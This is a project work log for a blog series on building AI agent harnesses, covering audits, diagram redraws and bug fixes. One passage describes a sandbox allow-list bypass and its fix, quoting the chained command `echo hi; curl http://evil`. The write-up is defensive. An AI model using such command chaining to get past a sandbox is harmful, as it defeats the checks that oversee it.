# Harness Engineering — work log

**This file is the entry point for resuming.** It carries the decisions, the
standard, the commands, and a per-post checklist. Update the checklist after
every post so this file alone is enough to continue from a cold start with no
conversation history.

Sibling repo: `C:\Users\admin\Desktop\ContextEngineering` — the same pass was
completed there (30 posts, 90 hand-drawn scenes, a root `poster/`). Its
generator at `assets/diagrams/excalidraw-generator/` is the thing to copy from,
and its `PROGRESS.md` records the rules that pass produced.

---

## 2026-09-05 — Phase A is finished. Diagrams are what is left.

`AUDIT-2026-09-04.md` is the full findings document; this is the outcome.

**The series now.** 26 posts, median **4,874** prose words (was 2,252), 131,325 total.
Median 13 numbered sections, 21 table rows and 4 code fences per post. **Every** post has
at least one table and one code fence; before this pass, 23 of 26 had no table and 5 had
no code at all. Em-dash maximum is **7** against the cap of 10, with zero breaches; seven
posts were over before. `python tools/audit.py` green, 80 companion tests passing.

**Five blockers found and fixed.** Three citation faults: a fabricated Osmani quotation
("structurally impossible", a phrase absent from his article), the Fowler/Morris
misattribution across four files, and the series' founding line credited to Anthropic when
it is Viv Trivedy's. Two code faults, each now pinned by a regression test that fails
against the old code: the Post 17 task board handed one task to two agents in 8 of 8
threaded trials, and Build #1's budget check sat below the gate-rejection `continue`,
making `BUDGET` unreachable (a 20x overrun). Build #2's jail also used a string prefix
(`/worksecrets` passed a `/work` jail) and shipped `python` on the default allow-list.
Tests went 74 -> 80.

**Verdict on more posts: none needed.** Six were proposed, five refuted on scope or
duplication by three-lens adversarial checks. The sixth (fault tolerance) is a real gap but
section-shaped, folded into Posts 19, 17 and 03.

**Repo furniture.** `templates/` created (post, diagram-style, code-readme, citation-style).
GLOSSARY 34 -> 118 entries, at parity with the sibling series. REFERENCES 98 -> 242 entries,
69 added and 24 corrected, with 24 web spot-checks; one submitted citation failed its
spot-check and was re-filed against the article that actually carries the figure. Frontmatter
went from 7 fields to the sibling's ~20 (description, keywords, hero_alt, prev/next,
category, series, toc). README badge and companion test counts corrected.

**Two things to know before editing.** (1) Posts are now long: reading times run 25-38
minutes, roughly 1.6x the Context Engineering sibling. That was a deliberate call, taken
because every added block traces to an audit finding, but it is reversible and a levelling
pass is the obvious lever if the series should read closer to CE. (2) All section numbers
changed, and a cross-reference pass has already re-checked every outbound reference in every
post against its current target; if you renumber again, re-run that pass.

**Phase B is done except the poster.** All 26 posts now carry three figures, three
`.excalidraw` scenes with rendered `.svg` companions, and a generated
`diagrams/excalidraw/README.md`: 78 figures, 78 scenes, 26 scene specs, 26 generators.
Posts 23-25 gained the third figure each was missing, and post 26 gained its three
alternates. `build:24`, `build:25` and `build:26` were dead npm scripts pointing at files
that had never been written; they now exist and run.

Three figures were newly drawn and published:

| Post | Figure | The section that had no picture |
|---|---|---|
| 23 | `03-build-vs-rent` | §9, the three questions that decide build against rent |
| 24 | `03-the-four-seams` | §9, each injected seam with the blast radius its swap opens |
| 25 | `03-what-tests-miss` | §10, three real bugs that shipped behind a green suite |

**Every one of them had a layout fault the first time it rendered**, and none was visible
without rasterising: text clipped past a card's bottom edge (23), a caption drawn over the
card beside it (24), footers overrunning their declared width (24, 25), stage arrows running
34px into the following card (26), and a per-gap label with 20px of gap to sit in (26).
`fit()` reports the fourth of those and cannot see any of the others. Render a PNG with
`preview.js` and look at it; that is the only check for this class of fault, and it is why
each scene spec's notes record what was moved and why.

**Still outstanding: the poster.** `build:poster` points at `poster.js`, which does not
exist, and `assets/poster/harness-anatomy.svg` promised in HARNESS-PLAN §6 has never been
drawn. The sibling series ships its one-pager at `poster/` in the repo root rather than
under `assets/`, which is the convention to follow. That is the last item in the plan.

---

## The job, in two phases

**Phase A — content: DONE.** All 26 posts pass `python tools/audit.py`.

**Phase A, as planned.** Expand the thin posts so the series reads evenly, then
keep the audit green. Ajay's decision, asked and answered: *expand* posts 13-20
and 24-26 rather than leave them tight. The builds (24-26) should end up the
deepest posts in the series, as they are in the CE sibling.

**Phase B — diagrams.** Every post gets a `diagrams/excalidraw/` directory with
hand-drawn `.excalidraw` scenes and roughjs-rendered `.svg` companions, exactly
as in the CE repo. Where a post needs a figure it does not have, draw it and
publish it. Ajay's words: *"if more diagrams are needed you can do so, do not
guess things check them properly."*

**Do not commit.** Ajay's decision: git is left alone entirely; he reviews and
commits himself. `git status` is the record of what this pass has touched.

---

## State at the start of the pass

- 26 posts, all with `index.md`, `frontmatter.yaml`, and 2-3 diagrams each.
- 8 code companions, all passing: 7, 15, 9, 9, 8, 9, 9, 8 tests = 74 total.
- In sync with `origin/main` at `43ad48c`; 47 uncommitted paths, of which 19
  whole posts and 7 code companions are untracked.
- Diagrams already use the CE `--ce-*` tokens, per HARNESS-PLAN.md §4.
- No `assets/` tree yet, though the plan's §2 layout expects one.

## What the audit found

Mechanical faults, both fixed:

- Posts 09 and 10 had a colon in the H1 where the frontmatter and every other
  post use an em dash. Those two posts also have zero em dashes in their prose
  where every other post has 3-8, so they look to have had an em-dash-stripping
  pass run over them that also hit the title.
- `reading_time` is uniformly 12-15 across the series regardless of length, an
  implied 83-197 words per minute. Recomputed from a single formula (below).

Checked and sound, so not touched: every code claim the posts make. The
filenames, the class names, and the test counts posts 24-26 quote all match the
companions on disk, and all eight suites pass.

---

## Faults found in the code, and fixed

Recorded because they are the kind that come back. Both were in
`code/25-harness-plus/`, both were invisible to the suite that shipped with it.

- **The sandbox allow-list could be walked around in one character.** It checked
  the first token of the command and then executed the raw string with
  `shell=True`, so `echo hi; curl http://evil` passed: `echo` is allow-listed,
  and the shell ran the `curl` anyway. Fixed by executing without a shell
  (`shlex.split` + an argv list) *and* refusing shell control characters, so the
  boundary holds even if a shell-using runner is swapped back in. The reason it
  survived review is worth remembering: every test injected a fake runner, so
  the real executor was never exercised.
- **The sandbox was the one gate you could not see fire.** Tool spans were
  tagged `blocked` (hook), `denied` (approval), or `ok`. A sandbox refuses
  *inside* the tool and returns an ordinary string, so every sandbox refusal was
  landing in `ok` — indistinguishable in the trace from a command that ran.
  Fixed with a `refused` outcome.

The companion went from 9 tests to 11; the two new ones assert the whole family
of chaining tricks and that a refusal reaches the trace. Posts 14 and 25 both
say so in prose now, and Post 14 gained a section on each.

---

## The standard

**Reading time.** One formula, applied everywhere:

    minutes = round(prose_words / 200 + code_lines / 25 + figures * 0.5)

Prose words exclude fenced code blocks. `tools/audit.py` enforces it within a
tolerance, so a post that grows without its frontmatter being updated fails.

**Expansion.** New material comes from the post's spec in HARNESS-PLAN.md §5 and
from the code companion, which usually holds far more detail than the post
surfaces. It never comes from invention: if a claim cannot be traced to the
plan, the code, or a source already in REFERENCES.md, it does not go in.

**Post shape** (enforced by the audit): H1 matching the frontmatter title, a
TL;DR block with a learning-objectives list, numbered H2 sections, a Common
pitfalls block, Further reading, and What to read next.

**Diagrams.** Same contract as the CE series: XML declaration, `role="img"`, a
`<title>`, a `<desc>` over 200 characters, a `viewBox` with no root
`width`/`height`, no raw hex in any paint attribute, a dark-mode block, no
emoji.

---

## The diagram pass, as settled

Decided on posts 01 and 02 and held for the rest:

- **Three scenes per post.** Every post gets a `diagrams/excalidraw/` directory
  with three hand-drawn scenes, each as an editable `.excalidraw` and a rendered
  `.svg`.
- **Scene filenames match the figures one directory up.** A mirror of
  `diagrams/01-foo.svg` is `diagrams/excalidraw/01-foo.svg`, and a new figure
  continues the numbering. That makes the two directories readable side by side,
  and it means a bare `node publish.js NN` would overwrite the clean vectors, so
  always name the figures you mean to promote.
- **Mirrors stay as alternates; genuinely new figures get published.** Posts
  02-25 each ship two clean vector figures, so each gains one new figure that is
  promoted into `diagrams/` and embedded in the post. Posts 01 and 26 already
  ship three, so all three of their scenes are alternates and nothing is
  promoted.
- **The new figure fills the section with the weakest picture**, not the section
  that is easiest to draw. It is chosen by reading the post for the argument
  that is running on prose alone.
- **Every post gets `diagrams/excalidraw/README.md`**, generated from a spec so
  the boilerplate cannot drift: write `tools/scene-specs/NN.json` (lede, scene
  table, notes) and run `python tools/mk_scene_readme.py tools/scene-specs/NN.json`.
- **Adding a figure changes the post.** The embed and its caption go in, the
  surrounding prose gains a sentence or two so the figure is referred to rather
  than dropped in, and `reading_time` is re-checked (`figures * 0.5` is a term in
  the formula). `python tools/audit.py NN` after every post.
- **House rules inherited from the CE pass**: no glyph outside Latin-1 plus
  en/em dashes; never `#FFFFFF` for knockout text (use `T.onAccent`); colour is
  never the only carrier of a distinction; draw a tint before the card, never
  over it; a thin accent spine is a 4px stroke, not a filled rect; and `fit()` is
  not a collision checker, so render a PNG with `preview.js` and look at it.

---

## Commands

```bash
python tools/audit.py              # the whole series; exit 1 on any failure
python tools/audit.py 07           # one post, plus the repo-wide checks
cd code/NN-name && python -m pytest -q
```

Phase B will add, mirroring the CE repo:

```bash
cd assets/diagrams/excalidraw-generator
npm install
npm run build:NN                   # scenes + svgs for post NN
node publish.js NN name-a          # promote named figures into diagrams/
node render-scene.js <scene>       # re-render after a hand edit
node preview.js <svg> <png> [dark] # rasterise to look at it
```

---

## Checklist

`A` = content pass done (expanded where needed, audit green).
`B` = diagram pass done (excalidraw scenes drawn, published, README written).

| # | post | words | A | B |
|---|------|-------|---|---|
| 01 | from-context-to-harness | 2200 | n/a | done |
| 02 | anatomy-of-a-harness | 2081 | n/a | done |
| 03 | the-agent-loop | 1932 | n/a | done |
| 04 | harness-beats-model | 1784 | n/a | done |
| 05 | agent-failure-modes | 1888 | n/a | done |
| 06 | tools-bash-code | 1771 | n/a | done |
| 07 | skills-mcp-runtime | 1974 | n/a | done |
| 08 | state-filesystem-git | 1709 | n/a | done |
| 09 | context-management-loop | 1586 -> 2284 | done | done |
| 10 | continual-learning-ratchet | 1531 -> 2381 | done | done |
| 11 | verification-loops | 1712 | n/a | done |
| 12 | planner-generator-evaluator | 1502 -> 2316 | done | done |
| 13 | hooks-enforcement | 1419 -> 2666 | done | done |
| 14 | permissions-sandboxes | 1616 -> 2458 | done | done |
| 15 | human-in-the-loop | 1285 -> 2275 | done | done |
| 16 | multi-agent-orchestration | 1390 -> 2235 | done | done |
| 17 | parallel-agents-shared-repo | 1289 -> 2197 | done | done |
| 18 | long-horizon-ralph | 1299 -> 2095 | done | done |
| 19 | loop-engineering | 1245 -> 1993 | done | done |
| 20 | sdk-landscape | 1300 -> 1930 | done | done |
| 21 | observability-traces | 2380 | n/a | done |
| 22 | evaluating-harnesses | 2759 | n/a | done |
| 23 | economics-haas | 2309 | n/a | |
| 24 | build-minimal-harness | 1306 -> 2368 | done | |
| 25 | build-harness-plus | 1157 -> 2130 | done | |
| 26 | capstone-coding-agent | 1508 -> 2432 | done | |
| -- | poster/ one-page sheet | | | |

`n/a` in column A means the post was already at or above the series norm and
needs no expansion — it still gets a read-through for faults during its batch.

**Expansion targets.** Bring every post to at least ~1900 prose words, and the
three builds (24-26) to ~2400, so the builds end up the deepest posts as they
are in the CE sibling. The thin set is 09, 10, 12, 14-20, 24-26. Posts 05, 06
and 11 needed only their `reading_time` corrected.

`python tools/audit.py` is the to-do list: every post still to be expanded fails
its reading-time check, because the stated minutes were assigned rather than
computed. Fixing the frontmatter is the last step of a post's content pass, so a
red audit line means that post has not been done yet.

Word counts are prose only, measured before the pass started.

## Diagram overhaul, 2026-09-05 (in progress)

Benchmarked the figures against the sibling **Vector DB from Scratch** series, which the
author judged better looking. The cause was policy, not skill: both repos run the same
generator, and each `publish.js` states its own rule in its header. Vector DB publishes the
roughjs render as *the* figure (114 of 114 identical to their `excalidraw/` twin). This repo
treated it as an opt-in alternate, so **53 of 78 published figures were the flat Inter
boxes-and-arrows** and 25 were hand-drawn, mixing both styles inside single posts.

Done and published:

- **All 78 figures are now the hand-drawn render.** `node publish.js` with no argument
  promotes everything; the twins already existed for all 53.
- **`heading()` now centres**, matching Vector DB. Was left-aligned, which only made sense
  while the flat figure (also left-aligned) was the published one.
- **Six layout faults fixed** in figures that had never been published and so had never been
  looked at: an arrow shaft running through two `worker` boxes and striking out both labels
  (16-01), a caching annotation drawn across three bars (23-01), `escape blocked` needing
  73px in a 60px gap (14-01), `stdio or HTTP` under a panel border (07-02), a `yes` on a box
  border (20-02). Fifteen were reported; nine were refuted with pixel evidence.
- **A density pass** on the figures an independent reviewer called thin. Posts 01-11, 13, 14,
  20 and 22 are redrawn and published, mostly by adding a second tier of panels and pulling
  real values out of `code/` and the posts themselves.
- **Post 22 fig 2 carried invented numbers** (`resolved 61%`, `$0.42 per resolved`, `+13 pts`)
  that appear nowhere in the post or the code, and the redraw put the post's *real* sign-test
  numbers beside them, so the figure headlined a 13-point win while the band beneath it said
  the actual worked case was a 6.7-point lift at p = 0.39. Every constant is now sourced from
  section 8, and the closing line no longer endorses shipping the lift.

Still to do, both interrupted by session limits:

- **Posts 15, 16, 17, 18, 19 and 12 are mid-redraw.** Their generators are edited and their
  `diagrams/excalidraw/` twins are rebuilt, but **nothing was published**, so the figures a
  reader sees are still the verified ones. Run `node publish.js NN` per post only after
  rendering each twin and looking at it.
- **Posts 21, 23, 24, 25, 26 never started.**
- **Only posts 20 and 22 got an independent verify pass.** Posts 01-11, 13 and 14 were
  self-checked by the agent that drew them and no one else. They should get a second look.

### Sequential pass over the remaining posts, 2026-09-05

All 26 posts are through the density pass. **78 of 78 published figures are the hand-drawn
render; the median aspect ratio is 1.66**, against the Vector DB series' 1.63 and this
repo's own 2.20 before the pass.

Posts 12, 15, 16, 17, 18 and 19 were finished from the half-done state the killed agents
left: their generators were already edited, so the work was to render, look, fix, and
publish. Their alt text had NOT been updated by those agents and was still describing the
old figures; it was rewritten from what is now drawn. Posts 21, 23, 24, 25 and 26 were
redrawn from scratch here.

Two layout faults were caught by looking that `fit()` could not see: post 18's reported-record
card cut its last line at the card border, and post 21's first tier drew a note on top of the
row above it. Both were found in the rasterised PNG, neither in the build output.

Every number added is sourced, and the sourcing was checked figure by figure rather than
trusted: post 12's cost table against index.md lines 234-236, post 15's gate budget against
line 253, post 16's latency arithmetic against line 155, post 17's eight-of-eight result
against line 53 and `test_board.py`, post 19's caps against `loop.py:40-41`, post 23's chart
against the section 6 table, post 24's report shapes against `verify.py`, post 25's gates
against `hooks.py` and `sandbox.py`, and post 26's span tree against the section 7 output.

**Post 22 figure 2 was carrying invented numbers** and is fixed: `resolved 61%`,
`$0.42 per resolved` and `+13 pts` appear nowhere in the post or the code. Worse, the redraw
had put the post's real sign-test numbers beside them, so the figure headlined a 13-point win
while the band beneath it reported the actual 6.7-point lift at p = 0.39. Every constant now
comes from section 8 and the closing line no longer endorses shipping the lift.

### The exactly-once bug is not fixed by the confirm line

`test_concurrent_claims_are_exactly_once` **failed** on a routine re-run: 403 claims for 400
tasks. A reproducer put the rate at roughly one trial in three. The diagnosis: `task-372` was
returned to two agents while only `task-372.a1` existed on disk, so one `os.rename` returned
without raising and without landing. Two agents renaming the same source to *different*
destinations do not collide the way two agents renaming to the same destination would.

The confirm line added in the earlier pass narrowed the window; it did not close it, and the
suite passed then by luck rather than by correctness. `claim()` now takes an
``O_CREAT | O_EXCL`` token keyed on the task name before it renames, which is exclusive on
both POSIX and Windows. 30 consecutive runs of the concurrency test pass; at the old failure
rate the odds of that happening by chance are about five in a million. The on-disk shape is
unchanged, so `complete()`, `counts()` and the figures still read the owner off the claim name.

**Outstanding, and it needs a decision.** The post still teaches the rename as the primitive:
the TL;DR, the section 3 sentence "The mechanism is an atomic rename", the code listing's
`# atomic: one winner` comment, the hero caption, and figure 1's "THE CLAIM, IN ONE OPERATION"
panel and its "what the confirm line caught" panel all now describe something the code no
longer does. The lesson survives intact -- the filesystem's own atomicity is the concurrency
control, with no central server -- but the primitive named throughout is wrong. That is a
Phase A content change and was not made here.

### The last two items, 2026-09-05

**Post 17's prose now matches its code.** The exclusive-create fix made the rename story
wrong in nine places, and all nine are corrected: the TL;DR, the hero caption, the section 3
paragraph, the code listing, the section 4 lesson, the frontmatter description, keyword and
`hero_alt`, and the class docstring. Three cross-references in post 08 went with it, though
post 08's *own* section 7 rename is about torn-write safety and is untouched, because that
one is still correct. The REFERENCES annotation on maildir was overstating its case too:
maildir's safety comes from every deliverer generating a name no other will, not from the
rename, which is exactly the distinction post 17 now turns on.

Two things fell out of the rewrite that were not obvious going in. The sweeper in section 6
would have been broken by the change: returning a task to `open/` without releasing its claim
token means no agent can ever claim it again, so the snippet now releases it. And section 4
is a better section than it was, because it now has two failures in it rather than one, and
the second explains why the first repair missed.

**The poster is built**, at `poster/one-page-of-harness-engineering.svg`, 1200 by 1700 to
print at A2. Seven panels: the claim, the eleven components in three bands around the loop,
the four exits, the six failure modes, the verifier ladder, what survives a reset, three
measured costs, and the order to build it in. Every number carries the post it comes from.

Three faults in the first cut, none of them visible in the build output:

| What | Why it was invisible |
|---|---|
| `circle()` takes a radius; it was passed a diameter | The discs drew fine, just at twice the size, swallowing their own digits |
| The failure panel's last line was cut by its own border | `fit()` measures a string against a width, not against the box it lands in |
| Its first row was drawn on top of the panel subtitle | Same: two elements, each individually within its measure |

`poster/README.md` records all three, because the next person to add a panel will hit them.

HARNESS-PLAN §6 named the sheet `assets/poster/harness-anatomy.svg`; it is at `poster/` in
the repository root, matching the sibling series and the `build:poster` script that has
always pointed there. The plan's tree, its §6 entry and its outstanding list are updated, and
the README links it from the header and the reference-assets table.

---

## The last two plan items, both closed

**The canonical heroes were checked one pair at a time, and only one pair disagreed.** §4 says
the ten hero diagrams are "drawn once, reused", and no post reuses another post's SVG. That is
the right call rather than a lapse: Post 03 draws the loop in full, and 05, 11 and 19 compress
it to a card reading *reason, act, observe* that cites Post 03 by number — reuse of the
vocabulary, where reuse of the file would waste the canvas on a picture the reader has already
seen. The same holds for the anatomy, for the topologies gallery (16 marks its swarm panel
"Post 17"), and for the three build-versus decisions, which are about components (02),
frameworks (20) and runtimes (23) and do not overlap.

**The one real conflict was Post 20 `03-harness-ab` against Post 22 `02-harness-ab-pipeline`.**
Post 20's figure held up twenty tasks as settling the choice "in an afternoon" and closed on
"sketches lose to evidence". Post 22's figure works a *larger* task set through to p = 0.39 and
explicitly declines to call it. Post 20's own §6 sides with Post 22 — *twenty tasks reliably
detect a large effect; they do not adjudicate seven points* — so the figure had dropped its own
post's caveat, which is the same fault found in Post 22 fig 2 earlier in this pass. It now
carries §6's worked numbers (61 against 68 of 100 runs, $0.42 against $0.61, $0.69 against
$0.90 per resolved task) and a full-width panel with the arithmetic that undercuts them.

**`assets/animations/` is built**: `01-the-loop-turning` and `02-context-reset`, the two moments
§4 names, plus a README and a `build:animations` script. Three rules, all recorded in that
README: only opacity is animated, because a roughjs shape is a path with the wobble baked into
its `d` and its geometry cannot animate; the still frame is the complete diagram, with the
motion a highlight layer on top that starts invisible; and the motion lives inside
`prefers-reduced-motion: no-preference`, which the second rule is what makes safe. They ship no
`.excalidraw` scene, because the animation *is* a stylesheet and a scene has nowhere to put one,
so a round trip through the editor would return a still that looks correct and has lost the
point. Posts 03, 09 and 18 link to them beside the relevant figure.

`renderSvg` gained two additive hooks for this: an element may carry `animClass`, and the caller
may pass `css`. **That claim was checked rather than reasoned about**, because the first check
was hollow — an `npm run build && git status` swallowed a build failure and reported the silence
as proof. All twenty-six generators were then run against a reverted copy of `lib.js` and
against the current one, and the 156 outputs (78 SVGs, 78 scenes) diff clean.

**A staleness sweep came out of the same work.** 54 of the 78 scene-spec entries still recorded
their pre-density canvas size and a status of `alternate`, and every one of the 26 ledes still
opened by counting alternates against published figures — a leftover from when the hand-drawn
render sat beside a clean vector instead of being the published figure. Those 26 READMEs shipped
that description to readers. Specs, ledes and the `mk_scene_readme.py` boilerplate are corrected
and all 26 regenerated.

**Nothing in HARNESS-PLAN is now outstanding.** Audit green on 26 posts, 80 tests passing across
8 companions, every relative link in the repo resolving except placeholders inside template
fences, and nothing committed.
